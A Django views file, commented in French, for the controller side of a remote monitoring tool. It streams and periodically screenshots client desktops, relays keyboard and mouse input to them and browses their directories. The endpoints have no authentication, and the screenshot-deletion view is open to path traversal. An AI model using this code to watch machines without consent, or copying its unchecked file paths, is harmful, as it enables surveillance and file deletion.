import socket
import threading
import cv2
import numpy as np
from pynput import keyboard, mouse
import time
import json
from datetime import datetime, timedelta
from django.core.files.base import ContentFile
from django.http import JsonResponse, StreamingHttpResponse
import os
from django.conf import settings

from django.shortcuts import render
from datetime import datetime, timedelta
import socket
import numpy as np
import threading
import cv2
import os
import time
from django.conf import settings

from django.http import StreamingHttpResponse, JsonResponse
from django.shortcuts import get_object_or_404
from django.views.decorators.csrf import csrf_exempt
from django.core.files.base import ContentFile

from django.core.serializers import serialize

from django.http import JsonResponse
import json

from rest_framework.decorators import api_view
from rest_framework.response import Response
from rest_framework import status

from .models import ClientInfo

# ---------------------------------------------------

# Configuration
HOST = "0.0.0.0"
PORT_STREAM = 12345
PORT_CONTROL = 12346

def index(request):
    return render(request, 'index.html')

def client_count(request):
    count = ClientInfo.objects.count()
    return JsonResponse({'count': count})


def get_active_client_count(request):
    #Retourne le nombre de clients actifs
    active_client_count = len(client_streams.keys())
    return JsonResponse({"active_clients": active_client_count})



# Dictionnaire pour stocker les flux vidéo par client
client_streams = {}

# Gestion des événements clavier/souris
def send_event(client_socket, event_type, event_data):
    """Envoie un événement clavier/souris au client."""
    try:
        event_message = f"{event_type}:{event_data}".encode('utf-8')
        client_socket.sendall(len(event_message).to_bytes(4, 'big'))
        client_socket.sendall(event_message)
    except (BrokenPipeError, ConnectionResetError) as e:
        print(f"Connexion interrompue lors de l'envoi ({event_type}): {e}")
    except Exception as e:
        print(f"Erreur d'envoi d'événement ({event_type}): {e}")

def keyboard_listener(client_socket):
    """Écoute les événements clavier et les envoie au client."""
    def on_press(key):
        try:
            if hasattr(key, 'char') and key.char is not None:  # Touche alphanumérique
                send_event(client_socket, "key_press", key.char)
            else:  # Touche spéciale
                send_event(client_socket, "key_press", str(key).replace("Key.", ""))
        except Exception as e:
            print(f"Erreur lors de la capture de la touche pressée : {e}")

    def on_release(key):
        try:
            if hasattr(key, 'char') and key.char is not None:  # Touche alphanumérique
                send_event(client_socket, "key_release", key.char)
            else:  # Touche spéciale
                send_event(client_socket, "key_release", str(key).replace("Key.", ""))
        except Exception as e:
            print(f"Erreur lors de la capture de la touche relâchée : {e}")

    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

def mouse_listener(client_socket):
    """Écoute les événements souris et les envoie au client."""
    def on_move(x, y):
        send_event(client_socket, "mouse_move", f"{x},{y}")

    def on_click(x, y, button, pressed):
        action = "press" if pressed else "release"
        button_name = "left" if button == mouse.Button.left else "right"
        send_event(client_socket, "mouse_click", f"{button_name}@{x},{y}")

    def on_scroll(x, y, dx, dy):
        send_event(client_socket, "mouse_scroll", f"{dx},{dy}")

    with mouse.Listener(on_move=on_move, on_click=on_click, on_scroll=on_scroll) as listener:
        listener.join()

def broadcast_server_ip(port=12345, broadcast_port=54321):
    """
    Diffuse périodiquement l'adresse IP et le port du serveur pour permettre 
    aux clients de le découvrir sur le réseau local.
    """
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP) as broadcast_socket:
        broadcast_socket.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        broadcast_message = f"SERVER_IP:{socket.gethostbyname(socket.gethostname())}:{port}"

        while True:
            broadcast_socket.sendto(broadcast_message.encode('utf-8'), ('<broadcast>', broadcast_port))
            print(f"Diffusion de l'adresse IP : {broadcast_message}")
            time.sleep(5)  # Diffuse toutes les 5 secondes

def request_directory_content(conn, directory_path):
    """
    Envoie une requête au client pour explorer un répertoire.
    """
    try:
        request = f"browse:{directory_path}".encode('utf-8')
        conn.sendall(len(request).to_bytes(4, 'big'))
        conn.sendall(request)

        # Recevoir la réponse
        response_size = int.from_bytes(conn.recv(4), 'big')
        response_data = conn.recv(response_size).decode('utf-8')
        directory_content = json.loads(response_data)
        return directory_content

    except Exception as e:
        print(f"Erreur lors de la demande du contenu du répertoire : {e}")
        return []

def get_directory_content(request):
    """
    API pour récupérer le contenu d'un répertoire sur le client.
    """
    client_id = request.GET.get('client_id')
    directory_path = request.GET.get('path', 'C:\\')  # Par défaut, C:\

    if not client_id or int(client_id) not in client_streams:
        return JsonResponse({"error": "Client non trouvé ou non connecté."}, status=404)

    conn = client_streams[int(client_id)]
    directory_content = request_directory_content(conn, directory_path)
    return JsonResponse({"content": directory_content})

def handle_client_connection(conn, addr):
    """
    Gère une connexion client individuelle, enregistre jusqu'à 100 captures d'écran
    et gère les flux vidéo pour le streaming.
    """
    try:
        print(f"Connexion établie avec {addr}")
        pc_name_size = int.from_bytes(conn.recv(4), 'big')
        pc_name = conn.recv(pc_name_size).decode('utf-8')
        os_name_size = int.from_bytes(conn.recv(4), 'big')
        os_name = conn.recv(os_name_size).decode('utf-8')
        ip_address = addr[0]
        capture_time = datetime.now()

        client, created = ClientInfo.objects.update_or_create(
            ip_address=ip_address,
            defaults={
                'pc_name': pc_name,
                'os_name': os_name,
                'capture_time': capture_time,
            }
        )

        client_id = client.id
        client_streams[client_id] = None
        capture_dir = os.path.join(settings.MEDIA_ROOT, f"client_screenshots/{client_id}/")
        os.makedirs(capture_dir, exist_ok=True)

        screenshot_count = 0
        last_capture_time = datetime.now() - timedelta(seconds=12)
        last_frame = None

        # Démarrer les écouteurs de clavier et souris
        threading.Thread(target=keyboard_listener, args=(conn,), daemon=True).start()
        threading.Thread(target=mouse_listener, args=(conn,), daemon=True).start()

        while screenshot_count < 100:
            frame_size_data = conn.recv(4)
            if not frame_size_data:
                break

            frame_size = int.from_bytes(frame_size_data, 'big')
            frame_data = b""
            while len(frame_data) < frame_size:
                packet = conn.recv(frame_size - len(frame_data))
                if not packet:
                    break
                frame_data += packet

            frame = np.frombuffer(frame_data, dtype=np.uint8)
            frame = cv2.imdecode(frame, cv2.IMREAD_COLOR)

            if frame is not None:
                last_frame = frame
                current_time = datetime.now()
                time_since_last_capture = (current_time - last_capture_time).total_seconds()

                if time_since_last_capture >= 12:
                    last_capture_time = current_time
                    _, buffer = cv2.imencode('.jpg', frame)
                    filename = f"{screenshot_count:03d}.jpg"
                    with open(os.path.join(capture_dir, filename), 'wb') as f:
                        f.write(buffer.tobytes())
                    screenshot_count += 1
                    print(f"Capture {screenshot_count} enregistrée pour {addr}")

                    screenshot_data = ContentFile(buffer.tobytes(), name=f"{ip_address}_screenshot.jpg")
                    client.screenshot.save(f"{ip_address}_screenshot_{screenshot_count}.jpg", screenshot_data, save=True)

                mouse_position_size_data = conn.recv(4)
                if mouse_position_size_data:
                    mouse_position_size = int.from_bytes(mouse_position_size_data, 'big')
                    mouse_position_data = conn.recv(mouse_position_size).decode('utf-8')

                    if mouse_position_data:
                        try:
                            mouse_x, mouse_y = map(int, mouse_position_data.split(','))
                            cv2.circle(frame, (mouse_x, mouse_y), 15, (0, 0, 255), -1)
                        except ValueError:
                            print(f"Erreur de conversion des coordonnées de la souris pour {addr}")

                _, buffer = cv2.imencode('.jpg', frame)
                client_streams[client_id] = buffer.tobytes()

        if last_frame is not None:
            _, buffer = cv2.imencode('.jpg', last_frame)
            screenshot_data = ContentFile(buffer.tobytes(), name=f"{ip_address}_last_screenshot.jpg")
            client.screenshot.save(f"{ip_address}_last_screenshot.jpg", screenshot_data, save=True)

    except (ConnectionResetError, BrokenPipeError):
        print(f"La connexion avec {addr} a été coupée.")
    finally:
        if client_id in client_streams:
            del client_streams[client_id]
        conn.close()

def start_server():
    """
    Démarre le serveur pour écouter les connexions des clients.
    """
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(("0.0.0.0", 12345))
    server_socket.listen(5)
    print("Serveur en écoute sur le port 12345...")

    threading.Thread(target=broadcast_server_ip, daemon=True).start()

    while True:
        conn, addr = server_socket.accept()
        threading.Thread(target=handle_client_connection, args=(conn, addr), daemon=True).start()

def stream_generator(client_id):
    """
    Générateur pour streamer les frames d'un client donné.
    """
    while True:
        if client_id in client_streams and client_streams[client_id] is not None:
            yield (b'--frame\r\n'
                   b'Content-Type: image/jpeg\r\n\r\n' + client_streams[client_id] + b'\r\n')
        else:
            yield (b'--frame\r\n'
                   b'Content-Type: text/plain\r\n\r\nClient non connecte ou deconnecte.\r\n')

def client_video_feed(request):
    """
    Vue Django pour diffuser le streaming d'un client.
    """
    client_id = request.GET.get('client_id')
    if not client_id or int(client_id) not in client_streams:
        return JsonResponse({"error": "Client non trouvé ou non connecté."}, status=404)
    return StreamingHttpResponse(stream_generator(int(client_id)),
                                 content_type='multipart/x-mixed-replace; boundary=frame')

if __name__ == "__main__":
    start_server()

# def broadcast_server_ip(port=12345, broadcast_port=54321):
#     """
#     Diffuse périodiquement l'adresse IP et le port du serveur pour permettre 
#     aux clients de le découvrir sur le réseau local.
#     """
#     with socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP) as broadcast_socket:
#         broadcast_socket.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
#         broadcast_message = f"SERVER_IP:{socket.gethostbyname(socket.gethostname())}:{port}"

#         while True:
#             broadcast_socket.sendto(broadcast_message.encode('utf-8'), ('<broadcast>', broadcast_port))
#             print(f"Diffusion de l'adresse IP : {broadcast_message}")
#             time.sleep(5)  # Diffuse toutes les 5 secondes

# #------------------------------------------------------------------------------------

# def request_directory_content(conn, directory_path):
#     """
#     Envoie une requête au client pour explorer un répertoire.
#     """
#     try:
#         request = f"browse:{directory_path}".encode('utf-8')
#         conn.sendall(len(request).to_bytes(4, 'big'))
#         conn.sendall(request)

#         # Recevoir la réponse
#         response_size = int.from_bytes(conn.recv(4), 'big')
#         response_data = conn.recv(response_size).decode('utf-8')
#         directory_content = json.loads(response_data)
#         return directory_content

#     except Exception as e:
#         print(f"Erreur lors de la demande du contenu du répertoire : {e}")
#         return []

# #------------------------------------------------------------------------------------

# def get_directory_content(request):
#     """
#     API pour récupérer le contenu d'un répertoire sur le client.
#     """
#     client_id = request.GET.get('client_id')
#     directory_path = request.GET.get('path', 'C:\\')  # Par défaut, C:\

#     if not client_id or int(client_id) not in client_streams:
#         return JsonResponse({"error": "Client non trouvé ou non connecté."}, status=404)

#     conn = client_streams[int(client_id)]
#     directory_content = request_directory_content(conn, directory_path)
#     return JsonResponse({"content": directory_content})

# #-----------------------------------------------------------------------------------
# def handle_client_connection(conn, addr):
#     """
#     Gère une connexion client individuelle, enregistre jusqu'à 100 captures d'écran
#     et gère les flux vidéo pour le streaming.
#     """
#     try:
#         print(f"Connexion établie avec {addr}")
#         pc_name_size = int.from_bytes(conn.recv(4), 'big')
#         pc_name = conn.recv(pc_name_size).decode('utf-8')
#         os_name_size = int.from_bytes(conn.recv(4), 'big')
#         os_name = conn.recv(os_name_size).decode('utf-8')
#         ip_address = addr[0]
#         capture_time = datetime.now()

#         client, created = ClientInfo.objects.update_or_create(
#             ip_address=ip_address,
#             defaults={
#                 'pc_name': pc_name,
#                 'os_name': os_name,
#                 'capture_time': capture_time,
#             }
#         )

#         client_id = client.id
#         client_streams[client_id] = None
#         capture_dir = os.path.join(settings.MEDIA_ROOT, f"client_screenshots/{client_id}/")
#         os.makedirs(capture_dir, exist_ok=True)

#         screenshot_count = 0
#         last_capture_time = datetime.now() - timedelta(seconds=12)
#         last_frame = None

#         while screenshot_count < 100:
#             frame_size_data = conn.recv(4)
#             if not frame_size_data:
#                 break

#             frame_size = int.from_bytes(frame_size_data, 'big')
#             frame_data = b""
#             while len(frame_data) < frame_size:
#                 packet = conn.recv(frame_size - len(frame_data))
#                 if not packet:
#                     break
#                 frame_data += packet

#             frame = np.frombuffer(frame_data, dtype=np.uint8)
#             frame = cv2.imdecode(frame, cv2.IMREAD_COLOR)

#             if frame is not None:
#                 last_frame = frame
#                 current_time = datetime.now()
#                 time_since_last_capture = (current_time - last_capture_time).total_seconds()

#                 if time_since_last_capture >= 12:
#                     last_capture_time = current_time
#                     _, buffer = cv2.imencode('.jpg', frame)
#                     filename = f"{screenshot_count:03d}.jpg"
#                     with open(os.path.join(capture_dir, filename), 'wb') as f:
#                         f.write(buffer.tobytes())
#                     screenshot_count += 1
#                     print(f"Capture {screenshot_count} enregistrée pour {addr}")

#                     screenshot_data = ContentFile(buffer.tobytes(), name=f"{ip_address}_screenshot.jpg")
#                     client.screenshot.save(f"{ip_address}_screenshot_{screenshot_count}.jpg", screenshot_data, save=True)

#                 mouse_position_size_data = conn.recv(4)
#                 if mouse_position_size_data:
#                     mouse_position_size = int.from_bytes(mouse_position_size_data, 'big')
#                     mouse_position_data = conn.recv(mouse_position_size).decode('utf-8')

#                     if mouse_position_data:
#                         try:
#                             mouse_x, mouse_y = map(int, mouse_position_data.split(','))
#                             cv2.circle(frame, (mouse_x, mouse_y), 15, (0, 0, 255), -1)
#                         except ValueError:
#                             print(f"Erreur de conversion des coordonnées de la souris pour {addr}")

#                 _, buffer = cv2.imencode('.jpg', frame)
#                 client_streams[client_id] = buffer.tobytes()

#         if last_frame is not None:
#             _, buffer = cv2.imencode('.jpg', last_frame)
#             screenshot_data = ContentFile(buffer.tobytes(), name=f"{ip_address}_last_screenshot.jpg")
#             client.screenshot.save(f"{ip_address}_last_screenshot.jpg", screenshot_data, save=True)

#     except (ConnectionResetError, BrokenPipeError):
#         print(f"La connexion avec {addr} a été coupée.")
#     finally:
#         if client_id in client_streams:
#             del client_streams[client_id]
#         conn.close()

# def start_server():
#     """
#     Démarre le serveur pour écouter les connexions des clients.
#     """
#     server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#     server_socket.bind(("0.0.0.0", 12345))
#     server_socket.listen(5)
#     print("Serveur en écoute sur le port 12345...")

#     threading.Thread(target=broadcast_server_ip, daemon=True).start()

#     while True:
#         conn, addr = server_socket.accept()
#         threading.Thread(target=handle_client_connection, args=(conn, addr), daemon=True).start()

# def stream_generator(client_id):
#     """
#     Générateur pour streamer les frames d'un client donné.
#     """
#     while True:
#         if client_id in client_streams and client_streams[client_id] is not None:
#             yield (b'--frame\r\n'
#                    b'Content-Type: image/jpeg\r\n\r\n' + client_streams[client_id] + b'\r\n')
#         else:
#             yield (b'--frame\r\n'
#                    b'Content-Type: text/plain\r\n\r\nClient non connecte ou deconnecte.\r\n')

# def client_video_feed(request):
#     """
#     Vue Django pour diffuser le streaming d'un client.
#     """
#     client_id = request.GET.get('client_id')
#     if not client_id or int(client_id) not in client_streams:
#         return JsonResponse({"error": "Client non trouvé ou non connecté."}, status=404)
#     return StreamingHttpResponse(stream_generator(int(client_id)),
#                                  content_type='multipart/x-mixed-replace; boundary=frame')

# if __name__ == "__main__":
#     start_server()


def get_active_clients(request):
    """
    Retourne une liste des clients actifs.
    """
    clients = ClientInfo.objects.filter(id__in=client_streams.keys())
    data = {
        "clients": [
            {
                "id": client.id,
                "pc_name": client.pc_name,
                "ip_address": client.ip_address,
            }
            for client in clients
        ]
    }
    return JsonResponse(data)

#-----------------------------------------------------------------------------------------------------------------------------    

def get_recent_connections(request):
    """
    Retourne les informations des dernières connexions avec les captures d'écran.
    """
    recent_clients = ClientInfo.objects.order_by('-capture_time')[:10]  # Récupérer les 10 dernières connexions
    data = [
        {
            "id": client.id,
            "pc_name": client.pc_name,
            "nom_client": client.nom_client,
            "os_name": client.os_name,
            "ip_address": client.ip_address,
            "capture_time": client.capture_time,
            "screenshot": client.screenshot.url if client.screenshot else None  # Vérification de la présence de la capture
        }
        for client in recent_clients
    ]
    return JsonResponse({"recent_connections": data})

#------------------------------------------------------------------------------------------------
def get_all_clients(request):
    """
    Retourne la liste de tous les clients enregistrés dans la base de données.
    """
    clients = ClientInfo.objects.all()
    data = [
        {
            "id": client.id,
            "pc_name": client.pc_name,
            "os_name": client.os_name,
            "nom_client":client.nom_client,
            "ip_address": client.ip_address,
            "capture_time": client.capture_time.strftime('%Y-%m-%d %H:%M:%S'),
        }
        for client in clients
    ]
    return JsonResponse({"clients": data})

#------------------------------------------------------------------------------
@csrf_exempt
def update_client_info(request, client_id):
    """
    Met à jour ou ajoute des informations spécifiques à un client.
    """
    if request.method == 'PATCH':
        try:
            client = get_object_or_404(ClientInfo, id=client_id)
            data = json.loads(request.body)

            # Vérifiez que les données envoyées sont valides
            print("Données reçues :", data)

            # Mise à jour des champs
            client.nom_client = data.get("nom_client", client.nom_client)
            client.additional_info = data.get("additional_info", client.additional_info)  # Exemple d'autre champ
            client.save()

            # Vérifiez la sauvegarde
            client.refresh_from_db()
            print("Client mis à jour :", client.nom_client)

            return JsonResponse({
                "success": "Informations mises à jour avec succès.",
                "client": {
                    "id": client.id,
                    "pc_name": client.pc_name,
                    "os_name": client.os_name,
                    "ip_address": client.ip_address,
                    "capture_time": client.capture_time,
                    "nom_client": client.nom_client
                }
            }, status=200)

        except Exception as e:
            print("Erreur lors de la mise à jour :", str(e))
            return JsonResponse({"error": str(e)}, status=400)

    return JsonResponse({"error": "Méthode non autorisée."}, status=405)


@api_view(['DELETE'])
def delete_client(request, client_id):
    try:
        # Récupérer le client avec l'ID
        client = get_object_or_404(ClientInfo, id=client_id)
        client.delete()
        return Response({"success": f"Client avec l'ID {client_id} supprimé avec succès."}, status=status.HTTP_200_OK)
    except Exception as e:
        return Response({"error": str(e)}, status=status.HTTP_400_BAD_REQUEST)

# -------------------------------------------------------------------------

def get_client_screenshots(request, client_id):
    """
    Retourne les 100 captures d'écran les plus récentes pour un client.
    """
    directory_path = os.path.join(settings.MEDIA_ROOT, f"client_screenshots/{client_id}/")
    screenshots = []

    if os.path.exists(directory_path):
        for filename in sorted(os.listdir(directory_path))[:100]:  # Les 100 premières
            screenshots.append(f"/media/client_screenshots/{client_id}/{filename}")

    return JsonResponse({"screenshots": screenshots})

# -----------------------------------------------------------------------------------
@csrf_exempt
def delete_client_screenshots(request, client_id):
    """
    Supprime les captures d'écran pour un client donné.
    """
    if request.method == "POST":
        screenshots_param = request.POST.get('screenshots', '')  
        screenshot_files = screenshots_param.split(",")
        deleted_files = []
        errors = []

        directory_path = os.path.join(settings.MEDIA_ROOT, f"client_screenshots/{client_id}/")

        for filename in screenshot_files:
            file_path = os.path.join(directory_path, filename)
            if os.path.exists(file_path):
                try:
                    os.remove(file_path)
                    deleted_files.append(filename)
                except Exception as e:
                    errors.append(f"Erreur lors de la suppression de {filename}: {str(e)}")
            else:
                errors.append(f"Fichier {filename} introuvable.")

        return JsonResponse({"deleted_files": deleted_files, "errors": errors})

    return JsonResponse({"error": "Méthode non autorisée."}, status=405)


# Démarrage du serveur dans un thread séparé
threading.Thread(target=start_server, daemon=True).start()